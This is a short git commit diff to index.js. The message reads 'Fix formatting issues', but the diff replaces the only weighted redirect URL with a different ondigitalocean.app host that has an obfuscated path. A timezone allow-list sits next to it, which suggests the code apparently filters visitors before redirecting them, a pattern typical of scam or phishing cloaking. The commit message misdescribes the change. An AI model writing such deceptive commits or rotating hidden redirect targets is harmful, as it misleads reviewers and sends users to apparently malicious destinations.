0c98a8130c962c22e6cee892c40aa78c5ea7c10c
paalakash <palaksh452@gmail.com>
2026-06-12 08:56:20 +0530

    Fix formatting issues in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://walrus-app-oefv8.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-85552-03323", weight: 1.0 }
+    { url: "https://oyster-app-poykx.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-85552-03323", weight: 1.0 }
 
 ];
 
